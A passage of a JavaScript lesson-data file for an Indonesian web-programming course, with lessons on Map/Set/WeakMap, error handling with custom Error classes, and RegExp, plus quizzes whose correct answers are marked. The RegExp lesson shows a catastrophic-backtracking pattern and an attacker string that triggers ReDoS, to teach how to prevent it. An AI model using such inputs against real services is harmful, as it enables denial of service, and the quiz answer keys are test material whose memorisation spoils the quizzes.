<code>Object.create(null)</code>.</td></tr><tr><td><strong>Urutan Iterasi</strong></td><td>Dijamin selalu sesuai **urutan penyisipan (<em>insertion order</em>)**.</td><td>Kunci string angka diurutkan lebih dulu sebelum kunci huruf.</td></tr></tbody></table>
<pre>const sesiAktif = new Map();

// Menambahkan data dengan .set(kunci, nilai)
sesiAktif.set(&quot;usr_101&quot;, { nama: &quot;Ayu&quot;, peran: &quot;admin&quot; });
sesiAktif.set(&quot;usr_102&quot;, { nama: &quot;Raka&quot;, peran: &quot;editor&quot; });

console.log(sesiAktif.size);           // 2
console.log(sesiAktif.has(&quot;usr_101&quot;)); // true
console.log(sesiAktif.get(&quot;usr_101&quot;)); // { nama: &quot;Ayu&quot;, peran: &quot;admin&quot; }

// Mengiterasi Map secara langsung dengan for...of
for (const [idPengguna, info] of sesiAktif) {
  console.log(\`\${idPengguna}: \${info.nama} (\${info.peran})\`);
}

// Menghapus satu item dengan .delete(kunci), atau mengosongkan semua dengan .clear()
sesiAktif.delete(&quot;usr_102&quot;);</pre>
<div class="callout waspada"><div class="callout-judul">⚠️ Kesalahan Umum pada <code>Map</code></div><p>Jangan mengakses atau mengisi <code>Map</code> menggunakan kurung siku seperti objek (<code>peta[&quot;kunci&quot;] = 123</code>)! Menulis <code>peta[&quot;kunci&quot;]</code> tidak menyimpan data ke dalam struktur internal <code>Map</code> (sehingga <code>peta.size</code> tetap <code>0</code>), melainkan hanya menempelkan properti objek biasa di luar <code>Map</code>. Selalu gunakan metode <strong><code>.set(kunci, nilai)</code></strong>, <strong><code>.get(kunci)</code></strong>, <strong><code>.has(kunci)</code></strong>, dan <strong><code>.delete(kunci)</code></strong>.</p></div>
<h2>2. <code>Set</code> dan Metode Operasi Himpunan Matematika Terbaru</h2>
<p><strong><code>Set</code></strong> adalah koleksi nilai berurutan yang menjamin <strong>setiap nilainya unik (tidak mungkin ada duplikat)</strong>.</p>
<p>Kegunaan paling populer dari <code>Set</code>:</p>
<ol><li><strong>Menghapus duplikat dari sebuah Array dalam satu baris:</strong> <code>const daftarUnik = [...new Set(daftarDenganDuplikat)];</code></li><li><strong>Memeriksa keberadaan item dengan sangat cepat (<code>set.has(nilai)</code> — O(1)).</strong></li></ol>
<h3>Operasi Himpunan <code>Set</code> Modern (Baseline Newly Available sejak 2024)</h3>
<p>Kini Anda tidak perlu lagi menulis <code>.filter()</code> manual untuk mencari irisan atau gabungan dua himpunan. <code>Set.prototype</code> telah dilengkapi 7 metode himpunan matematika bawaan:</p>
<pre>const keahlianBackend  = new Set([&quot;Go&quot;, &quot;PHP&quot;, &quot;PostgreSQL&quot;, &quot;Docker&quot;]);
const keahlianDevOps   = new Set([&quot;Linux&quot;, &quot;Docker&quot;, &quot;Kubernetes&quot;, &quot;PostgreSQL&quot;]);

// 1. intersection(): Irisan — elemen yang ada di KEDUA himpunan
const irisan = keahlianBackend.intersection(keahlianDevOps);
console.log([...irisan]); // [&quot;PostgreSQL&quot;, &quot;Docker&quot;]

// 2. union(): Gabungan seluruh elemen unik dari kedua himpunan
const gabungan = keahlianBackend.union(keahlianDevOps);
console.log([...gabungan]); // [&quot;Go&quot;, &quot;PHP&quot;, &quot;PostgreSQL&quot;, &quot;Docker&quot;, &quot;Linux&quot;, &quot;Kubernetes&quot;]

// 3. difference(): Selisih — ada di Backend, tetapi TIDAK ada di DevOps
const khususBackend = keahlianBackend.difference(keahlianDevOps);
console.log([...khususBackend]); // [&quot;Go&quot;, &quot;PHP&quot;]

// 4. Pemeriksaan hubungan himpunan (menghasilkan boolean):
console.log( new Set([&quot;Go&quot;, &quot;PHP&quot;]).isSubsetOf(keahlianBackend) ); // true</pre>
<h2>3. Mencegah Kebocoran Memori dengan <code>WeakMap</code> dan <code>WeakSet</code></h2>
<p>Apa yang terjadi jika Anda menggunakan objek (misalnya simpul elemen DOM <code>&lt;button&gt;</code> yang dinamis) sebagai kunci di dalam <code>Map</code> biasa, lalu elemen <code>&lt;button&gt;</code> tersebut dihapus dari halaman HTML?</p>
<ul><li>Karena <code>Map</code> biasa memegang **referensi kuat (<em>strong reference</em>)** ke elemen <code>&lt;button&gt;</code> tersebut, <em>Garbage Collector</em> <strong>tidak berani membebaskan memori elemen <code>&lt;button&gt;</code> itu</strong> selama entri di <code>Map</code> belum dihapus secara manual! Inilah penyebab umum kebocoran memori (<em>memory leak</em>) pada aplikasi Single-Page Application (SPA).</li></ul>
<p>Solusinya adalah <strong><code>WeakMap</code></strong> (dan <strong><code>WeakSet</code></strong>):</p>
<ul><li>Kunci pada <code>WeakMap</code> <strong>wajib berupa Objek</strong> (atau simbol non-registrasi).</li><li>Referensi ke objek kuncinya bersifat **lemah (<em>weak reference</em>)**: begitu objek kunci tersebut tidak lagi dirujuk oleh variabel lain di program (misalnya elemen DOM-nya sudah dihapus dari layar), <em>Garbage Collector</em> otomatis menghapus entri tersebut dari <code>WeakMap</code> dan membebaskan memorinya!</li><li>Karena isinya dapat dibersihkan sewaktu-waktu oleh <em>Garbage Collector</em>, <code>WeakMap</code> tidak dapat diiterasi (<code>for...of</code>) dan tidak memiliki properti <code>.size</code>.</li></ul>
<pre>// Menyimpan metadata internal yang terikat pada objek tanpa mencegah Garbage Collection
const metadataKomponen = new WeakMap();

let tombolSementara = { id: &quot;btn-1&quot;, teks: &quot;Simpan&quot; };
metadataKomponen.set(tombolSementara, { jumlahKlik: 5 });

console.log(metadataKomponen.get(tombolSementara)); // { jumlahKlik: 5 }

// Ketika referensi ke objek dihapus, entri di WeakMap ikut siap dibersihkan oleh GC!
tombolSementara = null;</pre>
<h2>4. <code>Symbol</code>: Kunci Properti Unik yang Bebas Benturan</h2>
<p><code>Symbol</code> adalah tipe primitif yang setiap pemanggilannya dijamin menghasilkan nilai unik yang tidak pernah sama (<code>Symbol(&quot;id&quot;) !== Symbol(&quot;id&quot;)</code>). Ia digunakan untuk:</p>
<ol><li>Menambahkan properti tersembunyi/internal pada objek tanpa khawatir tertimpa oleh kode lain atau ikut tercetak di <code>JSON.stringify()</code>.</li><li>Mendefinisikan perilaku protokol bawaan bahasa melalui <em>Well-Known Symbols</em> seperti <strong><code>Symbol.iterator</code></strong> (yang membuat objek kustom Anda bisa diiterasi dengan <code>for...of</code>!).</li></ol>
<h2>Latihan Praktik: Mengelola Hak Akses Pengguna dengan <code>Map</code> dan <code>Set</code></h2>
<p>Buatlah berkas <code>hak-akses.js</code> dan jalankan dengan Node.js:</p>
<ol><li>Buat <code>Map</code> bernama <code>peranPengguna</code> yang memetakan nama peran (<code>&quot;admin&quot;</code>, <code>&quot;penulis&quot;</code>, <code>&quot;pembaca&quot;</code>) ke sebuah objek <code>Set</code> berisi daftar izin (<em>permissions</em>, misalnya <code>&quot;baca&quot;</code>, <code>&quot;tulis&quot;</code>, <code>&quot;terbitkan&quot;</code>, <code>&quot;hapus&quot;</code>).</li><li>Buat fungsi <code>punyaIzin(peran, izinYangDicari)</code> yang memeriksa secara cepat dalam waktu <code>O(1)</code> apakah peran tersebut memiliki izin yang diminta.</li><li>Gunakan metode <code>.difference()</code> pada <code>Set</code> untuk mencetak izin apa saja yang dimiliki <code>&quot;admin&quot;</code> tetapi tidak dimiliki oleh <code>&quot;penulis&quot;</code>.</li></ol>
<div class="callout info"><div class="callout-judul">📚 Rujukan</div><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Keyed_collections" rel="noopener">Keyed collections (<code>Map</code>, <code>Set</code>, <code>WeakMap</code>, <code>WeakSet</code>) — MDN Web Docs</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map" rel="noopener"><code>Map</code> — MDN Web Docs</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set" rel="noopener"><code>Set</code> — MDN Web Docs</a></li></ul></div>
`,
    perintah: ["Map","Set","Object","WeakMap","Symbol","<button>"],
    kuis: [
        {"tanya":"Apa yang terjadi jika Anda menulis const peta = new Map(); peta[\"id\"] = 100;?","opsi":["Entri \"id\" berhasil disimpan dengan benar ke dalam Map dan peta.size bernilai 1.","Penulisan peta[\"id\"] = 100 hanya menambahkan properti objek biasa pada instans peta tanpa memasukkannya ke dalam struktur data internal Map, sehingga peta.get(\"id\") bernilai undefined dan peta.size tetap 0.","Mesin JavaScript melempar SyntaxError.","Kunci \"id\" otomatis dihapus setelah 1 detik."],"benar":1,"penjelasan":"Untuk menyimpan dan membaca data di dalam struktur internal Map, Anda wajib menggunakan metode .set(key, value) dan .get(key). Menggunakan kurung siku peta[\"id\"] memperlakukannya sebagai properti objek umum biasa yang diabaikan oleh operasi Map."},
        {"tanya":"Mengapa kita memilih WeakMap dibandingkan Map biasa ketika ingin mengaitkan data tambahan pada objek elemen DOM yang sering dibuat dan dihapus secara dinamis?","opsi":["Karena WeakMap dapat menyimpan kunci berupa angka dan boolean dengan lebih cepat.","Karena WeakMap memegang referensi lemah (weak reference) terhadap objek kuncinya, sehingga ketika elemen DOM tersebut dihapus dari dokumen dan tidak lagi memiliki referensi lain, Garbage Collector dapat langsung membebaskan memorinya tanpa menyebabkan kebocoran memori (memory leak).","Karena WeakMap otomatis menyimpan datanya ke localStorage.","Karena WeakMap memiliki metode .map() dan .filter()."],"benar":1,"penjelasan":"Pada Map biasa, referensi ke objek kunci bersifat kuat sehingga mencegah Garbage Collector membersihkan objek tersebut meskipun sudah tidak dipakai di bagian program lain. WeakMap mengizinkan pembersihan memori otomatis begitu objek kuncinya tidak lagi terjangkau."},
        {"tanya":"Diberikan dua himpunan: const a = new Set([1, 2, 3]); dan const b = new Set([2, 3, 4]);. Metode Set manakah yang menghasilkan himpunan baru berisi Set { 1 } (elemen yang ada di a, tetapi tidak ada di b)?","opsi":["a.intersection(b)","a.union(b)","a.difference(b)","a.symmetricDifference(b)"],"benar":2,"penjelasan":"Metode a.difference(b) mengembalikan objek Set baru yang berisi elemen-elemen yang terdapat di dalam himpunan a namun tidak terdapat di dalam himpunan b (yaitu { 1 }). Adapun symmetricDifference akan mengembalikan elemen yang tidak beririsan dari kedua sisi ({ 1, 4 })."}
    ]
},
{
    id: 7,
    kategori: "2 · Objek & Data",
    judul: "Penanganan Galat (Error Handling), Custom Error, dan Error cause",
    tingkat: "Menengah", durasi: "9 mnt",
    tag: ["cause","catch","try"],
    ringkas: "Membangun aplikasi yang tangguh menghadapi kegagalan menggunakan try...catch...finally, memahami jenis-jenis Error bawaan, merancang Custom Error Class, serta merangkai jejak penyebab galat dengan properti { cause }.",
    isi: `
<h2>Mengapa Program Tidak Boleh &quot;Menelan Galat Diam-Diam&quot;?</h2>
<p>Kesalahan jaringan, masukan JSON yang rusak, atau penyimpanan peramban yang penuh adalah kenyataan sehari-hari di lingkungan produksi. Dua kesalahan paling berbahaya dalam menangani galat adalah:</p>
<ol><li><strong>Tidak menangani galat sama sekali</strong> pada operasi berisiko (seperti <code>JSON.parse()</code>), sehingga satu data yang rusak menghentikan seluruh eksekusi skrip di halaman pengguna.</li><li>**Menelan galat secara diam-diam (<em>silent catch</em>)** dengan menulis <code>try { ... } catch (e) {}</code> kosong tanpa pencatatan atau pemulihan, sehingga ketika fitur gagal bekerja, tidak ada seorang pun yang tahu apa penyebabnya!</li></ol>
<h2>1. Mekanisme <code>try...catch...finally</code> dan <code>throw</code></h2>
<pre>function bacaKonfigurasiJson(teksMentah) {
  try {
    const data = JSON.parse(teksMentah);

    if (!data || typeof data.port !== &quot;number&quot;) {
      // Melempar galat secara sengaja jika struktur data tidak memenuhi syarat
      throw new TypeError(&quot;Properti 'port' wajib berupa angka.&quot;);
    }

    return data;
  } catch (galat) {
    // Blok catch menangkap galat dari JSON.parse() maupun dari throw di atas
    console.error(&quot;Gagal memuat konfigurasi, menggunakan nilai bawaan:&quot;, galat.message);
    return { port: 8080, mode: &quot;aman&quot; };
  } finally {
    // Blok finally SELALU dijalankan di akhir (baik sukses maupun gagal,
    // bahkan jika di dalam try/catch terdapat perintah return!)
    console.log(&quot;Pemeriksaan konfigurasi selesai.&quot;);
  }
}</pre>
<div class="callout info"><div class="callout-judul">💡 Aturan Emas: Selalu Lempar Instans <code>Error</code>, Jangan Melempar String Mentah!</div><p>Di JavaScript, secara teknis Anda bisa menulis <code>throw &quot;Gagal login&quot;;</code>. Namun <strong>jangan pernah melakukan itu!</strong> Jika Anda melempar string mentah, objek yang ditangkap di <code>catch (err)</code> tidak memiliki properti <strong><code>err.message</code></strong>, <strong><code>err.name</code></strong>, dan yang paling penting tidak memiliki jejak tumpukan pemanggilan (**<code>err.stack</code> / <em>stack trace</em><strong>) untuk mencari di baris mana kesalahan terjadi. Selalu gunakan </strong><code>throw new Error(&quot;Pesan jelas&quot;)</code>** atau subkelasnya!</p></div>
<h2>2. Mengenal Jenis-Jenis <code>Error</code> Bawaan JavaScript</h2>
<p>Setiap objek galat standar memiliki properti <code>name</code> dan <code>message</code>:</p>
<table><thead><tr><th>Kelas Galat Bawaan</th><th>Kapan Terjadi atau Digunakan?</th></tr></thead><tbody><tr><td><code>SyntaxError</code></td><td>Kode tidak valid secara tata bahasa, atau ketika <code>JSON.parse()</code> menerima teks JSON yang rusak.</td></tr><tr><td><code>ReferenceError</code></td><td>Mencoba mengakses variabel yang belum dideklarasikan atau masih berada di <em>Temporal Dead Zone</em>.</td></tr><tr><td><code>TypeError</code></td><td>Nilai bukanlah tipe yang diharapkan (misalnya memanggil <code>null.toString()</code> atau mengubah variabel <code>const</code>).</td></tr><tr><td><code>RangeError</code></td><td>Nilai numerik berada di luar rentang yang diizinkan (misalnya <code>new Array(-5)</code> atau <code>(10).toFixed(200)</code>).</td></tr><tr><td><code>URIError</code></td><td>Fungsi pengodean URL seperti <code>decodeURIComponent(&quot;%&quot;)</code> menerima urutan persen yang cacat.</td></tr><tr><td><code>AggregateError</code></td><td>Membungkus beberapa galat sekaligus dalam satu objek (misalnya saat <code>Promise.any()</code> gagal seluruhnya).</td></tr></tbody></table>
<h2>3. Membuat <em>Custom Error Class</em> dan Merangkai Penyebab dengan <code>{ cause }</code></h2>
<p>Dalam aplikasi yang terstruktur, bagian tampilan (<em>UI layer</em>) perlu membedakan apakah kegagalan terjadi karena <strong>kesalahan input pengguna</strong> (<code>GalatValidasi</code>), <strong>kesalahan jaringan/server</strong> (<code>GalatJaringan</code>), atau <strong>bug pemrograman</strong> (<code>TypeError</code>).</p>
<p>Kita dapat membuat kelas galat khusus dengan mewarisi <code>Error</code>, serta meneruskan galat asli tingkat bawah menggunakan opsi <strong><code>{ cause: galatAsli }</code></strong> (status <strong>Baseline Widely Available</strong> sejak ES2022):</p>
<pre>class GalatLayananData extends Error {
  constructor(pesan, { kodeStatus = 500, cause } = {}) {
    // Meneruskan pesan dan opsi { cause } ke konstruktor Error bawaan
    super(pesan, { cause });
    this.name = &quot;GalatLayananData&quot;;
    this.kodeStatus = kodeStatus;
  }
}

class GalatValidasiInput extends Error {
  constructor(kolom, pesan) {
    super(\`Kolom '\${kolom}': \${pesan}\`);
    this.name = &quot;GalatValidasiInput&quot;;
    this.kolom = kolom;
  }
}

// Contoh menangkap galat tingkat rendah, membungkusnya dengan konteks bisnis yang jelas,
// namun tetap mempertahankan jejak galat aslinya lewat 'cause':
function ambilProfilDariCache(teksJson) {
  try {
    return JSON.parse(teksJson);
  } catch (galatAsli) {
    throw new GalatLayananData(
      &quot;Data profil di penyimpanan lokal rusak dan tidak dapat diurai.&quot;,
      { kodeStatus: 422, cause: galatAsli }
    );
  }
}

// Menangani galat secara selektif dengan instanceof (dan melempar ulang galat yang tidak dikenal!)
try {
  ambilProfilDariCache(&quot;{ json_rusak &quot;);
} catch (err) {
  if (err instanceof GalatLayananData) {
    console.warn(\`[Status \${err.kodeStatus}] \${err.message}\`);
    console.warn(&quot;Penyebab teknis asli:&quot;, err.cause.message);
  } else {
    // Jangan menelan bug tak terduga! Lempar ulang jika bukan galat yang kita antisipasi.
    throw err;
  }
}</pre>
<h2>Kesalahan Umum dan Cara Menghindarinya</h2>
<ol><li><strong>Menangkap semua galat di <code>catch</code> dan menganggap semuanya adalah satu masalah yang sama:</strong><ul><li><strong>Buruk:</strong> Menulis blok <code>try</code> sepanjang 50 baris lalu di dalam <code>catch</code> langsung menampilkan <em>&quot;Koneksi internet Anda terputus&quot;</em>, padahal yang terjadi di dalam <code>try</code> adalah <code>TypeError</code> akibat salah ketik nama variabel!</li><li><strong>Lebih Baik:</strong> Jaga agar blok <code>try</code> sekecil dan sespesifik mungkin hanya di sekitar operasi yang memang berisiko gagal, dan periksa tipe galat menggunakan <code>instanceof</code> di dalam <code>catch</code>.</li></ul></li><li><strong>Menggunakan <code>return</code> di dalam blok <code>finally</code>:</strong><ul><li><strong>Bahaya:</strong> Jika Anda menulis pernyataan <code>return nilaiLain</code> di dalam blok <code>finally</code>, pernyataan tersebut akan <strong>menimpa nilai <code>return</code> dari blok <code>try</code> dan bahkan membatalkan <code>throw</code> galat dari blok <code>catch</code></strong>! Gunakan <code>finally</code> murni hanya untuk pembersihan sumber daya (seperti mematikan indikator <em>loading</em> atau menutup koneksi).</li></ul></li></ol>
<h2>Latihan Praktik: Validator Data Transaksi dengan Custom Error</h2>
<p>Buatlah berkas <code>validasi-transaksi.js</code> dan jalankan dengan Node.js:</p>
<ol><li>Buat <code>class GalatTransaksi extends Error</code> yang menerima <code>(pesan, { kode, cause } = {})</code>.</li><li>Buat fungsi <code>prosesPembayaran(jsonInput)</code> yang mengurai <code>jsonInput</code> dengan <code>JSON.parse()</code> (jika gagal, lempar <code>GalatTransaksi</code> dengan <code>kode: &quot;JSON_RUSAK&quot;</code> dan <code>cause</code> berisi galat <code>SyntaxError</code> asli).</li><li>Jika <code>nominal &lt;= 0</code>, lempar <code>GalatTransaksi</code> dengan <code>kode: &quot;NOMINAL_TIDAK_SAH&quot;</code>.</li><li>Tangkap galat di pemanggil utama dan cetak <code>err.kode</code>, <code>err.message</code>, serta <code>err.cause?.message</code>.</li></ol>
<div class="callout info"><div class="callout-judul">📚 Rujukan</div><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Control_flow_and_error_handling" rel="noopener">Control flow and error handling — MDN Web Docs</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Error" rel="noopener"><code>Error</code> — MDN Web Docs</a></li><li><a href="https://tc39.es/ecma262/" rel="noopener">ECMAScript Language Specification — TC39</a></li></ul></div>
`,
    perintah: ["catch","try","JSON.parse()","Error","TypeError","finally"],
    kuis: [
        {"tanya":"Mengapa melempar galat dengan throw new Error(\"Koneksi terputus\") jauh lebih baik daripada melempar string mentah throw \"Koneksi terputus\"?","opsi":["Karena throw \"string\" tidak dapat ditangkap oleh blok catch.","Karena objek Error secara otomatis merekam jejak tumpukan pemanggilan fungsi (stack trace pada properti .stack) serta menyediakan properti standar .name, .message, dan .cause yang dibutuhkan saat debugging.","Karena new Error() otomatis mengirim laporan ke server.","Karena string tidak dapat ditampilkan di console.error()."],"benar":1,"penjelasan":"Ketika Anda melempar nilai primitif seperti string, Anda kehilangan informasi paling berharga saat melacak bug, yaitu stack trace (daftar urutan fungsi dan nomor baris kode tempat galat dilempar). Selain itu, kode pemanggil yang mengharapkan err.message akan memperoleh undefined."},
        {"tanya":"Apa kegunaan opsi { cause: galatAsli } saat membuat objek new Error(\"Gagal menyimpan pesanan\", { cause: galatAsli })?","opsi":["Menghentikan eksekusi blok finally.","Menyimpan referensi ke objek galat tingkat rendah yang menjadi pemicu awal di dalam properti err.cause, sehingga pesan galat tingkat tinggi tetap mudah dipahami tanpa menghilangkan rincian teknis aslinya untuk keperluan log/debugging.","Mengulang eksekusi blok try secara otomatis sebanyak tiga kali.","Mengubah tipe galat menjadi SyntaxError."],"benar":1,"penjelasan":"Dalam arsitektur berlapis, kita sering menangkap galat teknis (seperti kegagalan kueri atau penguraian JSON) dan melempar galat domain yang lebih bermakna. Properti standar cause (sejak ES2022) merangkai kedua galat tersebut sehingga jejak akar masalahnya tidak hilang."},
        {"tanya":"Kapan kode di dalam blok finally pada struktur try...catch...finally akan dijalankan?","opsi":["Hanya ketika tidak ada galat yang terjadi di dalam blok try.","Hanya ketika galat berhasil ditangkap oleh blok catch.","Selalu dijalankan baik ketika blok try berhasil hingga selesai, maupun ketika terjadi galat yang ditangkap di catch, bahkan sesaat sebelum fungsi keluar akibat perintah return.","Hanya ketika pengguna menutup tab peramban."],"benar":2,"penjelasan":"Blok finally dijamin selalu dieksekusi sebelum alur kontrol meninggalkan struktur try...catch, sehingga menjadikannya tempat paling tepat untuk tugas pembersihan seperti menyembunyikan loading spinner atau melepas kunci sumber daya."}
    ]
},
{
    id: 8,
    kategori: "2 · Objek & Data",
    judul: "Ekspresi Reguler (RegExp) Modern, Named Capture Groups, dan Pencegahan ReDoS",
    tingkat: "Menengah", durasi: "9 mnt",
    tag: ["RegExp","+","*"],
    ringkas: "Memvalidasi, mencari, dan mengekstrak pola teks kompleks menggunakan RegExp modern (flag g, i, u, v), Named Capture Groups (?<nama>...), metode matchAll() dan replaceAll(), serta menghindari celah Regular Expression Denial of Service (ReDoS).",
    isi: `
<h2>Kapan Menggunakan Metode String Biasa vs <code>RegExp</code>?</h2>
<p>Untuk pemeriksaan sederhana—seperti mengecek apakah kalimat diawali kata tertentu atau mengandung potongan kata tetap—selalu utamakan metode <code>String</code> biasa yang cepat dan mudah dibaca: <strong><code>teks.includes()</code></strong>, <strong><code>teks.startsWith()</code></strong>, <strong><code>teks.endsWith()</code></strong>, dan <strong><code>teks.replaceAll(&quot;lama&quot;, &quot;baru&quot;)</code></strong>.</p>
<p>Gunakan <strong>Regular Expressions (<code>RegExp</code>)</strong> ketika Anda berhadapan dengan <strong>pola yang bervariasi</strong>—seperti mengekstrak tanggal <code>YYYY-MM-DD</code> dari log server, memvalidasi format nomor induk/kode produk, atau mencari seluruh tag <code>#topik</code> di dalam artikel.</p>
<h2>1. Sintaks Dasar, Kelas Karakter, dan Kuantifier</h2>
<p>Sebuah pola <code>RegExp</code> dapat ditulis sebagai literal <code>/pola/flags</code> atau lewat konstruktor <code>new RegExp(&quot;pola&quot;, &quot;flags&quot;)</code>:</p>
<table><thead><tr><th>Token Pola</th><th>Arti Pencocokan</th><th>Contoh</th></tr></thead><tbody><tr><td><code>\\d</code> / <code>\\D</code></td><td>Satu digit angka (<code>0–9</code>) / Bukan digit angka</td><td><code>\\d{4}</code> cocok dengan <code>&quot;2026&quot;</code></td></tr><tr><td><code>\\w</code> / <code>\\W</code></td><td>Karakter kata ASCII (<code>a-z</code>, <code>A-Z</code>, <code>0-9</code>, <code>_</code>) / Bukan karakter kata</td><td><code>\\w+</code> cocok dengan <code>&quot;user_01&quot;</code></td></tr><tr><td><code>\\s</code> / <code>\\S</code></td><td>Spasi putih (spasi, tab, baris baru) / Bukan spasi</td><td><code>\\s+</code> cocok dengan spasi ganda</td></tr><tr><td><code>\\p{L}</code> (dengan flag <code>u</code>/<code>v</code>)</td><td><strong>Huruf Unicode apa pun</strong> dari bahasa mana pun di dunia!</td><td><code>/^\\p{L}+$/u</code> cocok dengan huruf Latin maupun aksara non-Latin</td></tr><tr><td><code>^</code> dan <code>$</code></td><td>Jangkar awal string (<code>^</code>) dan akhir string (<code>$</code>)</td><td><code>/^\\d{6}$/</code> memastikan seluruh string tepat 6 digit</td></tr><tr><td><code>+</code>, <code>*</code>, <code>?</code></td><td><code>1</code> atau lebih (<code>+</code>), <code>0</code> atau lebih (<code>*</code>), opsional <code>0</code> atau <code>1</code> (<code>?</code>)</td><td><code>https?</code> cocok dengan <code>&quot;http&quot;</code> dan <code>&quot;https&quot;</code></td></tr><tr><td><code>{n,m}</code></td><td>Jumlah pengulangan minimal <code>n</code> kali dan maksimal <code>m</code> kali</td><td><code>[a-z]{3,10}</code></td></tr></tbody></table>
<h3>Bendera (<em>Flags</em>) Penting pada RegExp Modern</h3>
<ul><li>**<code>i</code> (<em>ignoreCase</em>):** Mengabaikan perbedaan huruf besar dan kecil.</li><li>**<code>g</code> (<em>global</em>):** Mencari seluruh kemunculan di dalam teks, bukan berhenti pada kecocokan pertama saja.</li><li>**<code>u</code> (<em>unicode</em>) / <code>v</code> (<em>unicodeSets</em> — Baseline Widely Available sejak Maret 2026; didukung semua peramban utama sejak September 2023):** Mengaktifkan dukungan penuh karakter UTF-16/emoji dan properti karakter Unicode <code>\\p{...}</code>!</li></ul>
<h2>2. Mengekstrak Data Terstruktur dengan <em>Named Capture Groups</em> (<code>(?&lt;nama&gt;...)</code>)</h2>
<p>Dulu, mengekstrak bagian tanggal dari regex <code>/(\\d{4})-(\\d{2})-(\\d{2})/</code> mengharuskan kita mengakses indeks angka <code>hasil[1]</code>, <code>hasil[2]</code>, <code>hasil[3]</code> yang membingungkan jika urutan grup diubah.</p>
<p>Dengan <strong>Named Capture Groups (<code>(?&lt;namaGrup&gt;...)</code>)</strong> (status <strong>Baseline Widely Available</strong>), hasil tangkapan langsung tersedia sebagai objek bernama di dalam properti <strong><code>.groups</code></strong>:</p>
<pre>const polaLog = /^\\[(?&lt;tanggal&gt;\\d{4}-\\d{2}-\\d{2})\\]\\s+(?&lt;tingkat&gt;INFO|WARN|ERROR):\\s+(?&lt;pesan&gt;.+)$/;

const barisLog = &quot;[2026-10-16] ERROR: Koneksi ke PostgreSQL terputus&quot;;
const cocok = polaLog.exec(barisLog);

if (cocok) {
  const { tanggal, tingkat, pesan } = cocok.groups;
  console.log({ tanggal, tingkat, pesan });
  // { tanggal: &quot;2026-10-16&quot;, tingkat: &quot;ERROR&quot;, pesan: &quot;Koneksi ke PostgreSQL terputus&quot; }
}</pre>
<h2>3. Mencari Banyak Kecocokan Sekaligus dengan <code>String.prototype.matchAll()</code></h2>
<p>Jika Anda ingin mengekstrak semua kemunculan pola beserta grup tangkapannya di dalam sebuah teks panjang, jangan lagi menulis perulangan <code>while ((m = regex.exec(teks)) !== null)</code>! Gunakan <strong><code>teks.matchAll(regexGlobal)</code></strong> (wajib menyertakan flag <code>g</code>):</p>
<pre>const teksArtikel = &quot;Pelajari #html, #css, dan #javascript di Kodeloka!&quot;;
const polaTagar = /#(?&lt;topik&gt;[a-z0-9_-]+)/gi;

// matchAll() mengembalikan iterator yang bisa langsung diubah menjadi Array atau di-for...of
const daftarTopik = Array.from(
  teksArtikel.matchAll(polaTagar),
  (m) =&gt; m.groups.topik.toLowerCase()
);

console.log(daftarTopik); // [&quot;html&quot;, &quot;css&quot;, &quot;javascript&quot;]</pre>
<h2>4. Bahaya Keamanan <em>Catastrophic Backtracking (ReDoS)</em></h2>
<p>Hati-hati saat menulis kuantifier yang bersarang di dalam grup kuantifier lain—seperti <strong><code>/(a+)+$/</code></strong> atau <strong><code>/^([a-zA-Z0-9]+\\s?)+$/</code></strong>!</p>
<p>Mengapa pola seperti <code>/(a+)+$/</code> sangat berbahaya? Jika penyerang mengirimkan string berisi 30 huruf <code>&quot;a&quot;</code> yang diakhiri tanda seru (<code>&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!&quot;</code>), mesin regex akan mencoba jutaan kombinasi pembagian grup <code>(a+)+</code> sebelum menyadari bahwa karakter terakhir bukan <code>&quot;a&quot;</code>. Akibatnya, **utas utama JavaScript (atau server Node.js) langsung membeku 100% CPU selama beberapa menit (<em>Regular Expression Denial of Service / ReDoS</em>)**!</p>
<div class="callout bahaya"><div class="callout-judul">🚫 Tiga Cara Mencegah ReDoS</div><ol><li><strong>Jangan pernah membuat grup dengan <code>+</code> atau <code>*</code> yang di dalamnya juga terdapat <code>+</code> atau <code>*</code> yang saling tumpang tindih</strong> (ganti <code>/(a+)+$/</code> menjadi <code>/a+$/</code> yang sederhana dan linier!).</li><li><strong>Batasi panjang string masukan (<code>if (input.length &gt; 500) throw ...</code>)</strong> sebelum mengujinya dengan regex.</li><li>Gunakan kuantifier spesifik yang jelas batasannya (seperti <code>{1,64}</code>) alih-alih <code>+</code> tak terbatas pada input publik.</li></ol></div>
<h2>Latihan Praktik: Pengurai Versi Semantik (SemVer) dengan Named Capture Groups</h2>
<p>Buatlah berkas <code>regex-semver.js</code> dan jalankan dengan Node.js:</p>
<ol><li>Buat fungsi <code>uraiVersi(teksVersi)</code> yang menggunakan regex dengan <em>Named Capture Groups</em> <code>(?&lt;major&gt;\\d+)\\.(?&lt;minor&gt;\\d+)\\.(?&lt;patch&gt;\\d+)(?:-(?&lt;prarelis&gt;[0-9A-Za-z.-]+))?</code> yang terjangkar dengan <code>^</code> dan <code>$</code>.</li><li>Kembalikan objek <code>{ major: Number(...), minor: Number(...), patch: Number(...), prarelis: ... }</code> atau <code>null</code> jika formatnya tidak sah (misalnya <code>&quot;8.5.0-rc.1&quot;</code> sah, sedangkan <code>&quot;v8.5&quot;</code> tidak sah).</li></ol>
<div class="callout info"><div class="callout-judul">📚 Rujukan</div><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_expressions" rel="noopener">Regular expressions — MDN Web Docs</a></li><li><a href="https://tc39.es/ecma262/multipage/text-processing.html" rel="noopener">Text Processing (<code>RegExp</code> and <code>String</code>) — TC39 ECMAScript Specification</a></li></ul></div>
`,
    perintah: ["+","*","RegExp","/(a+)+$/","u","v"],
    kuis: [
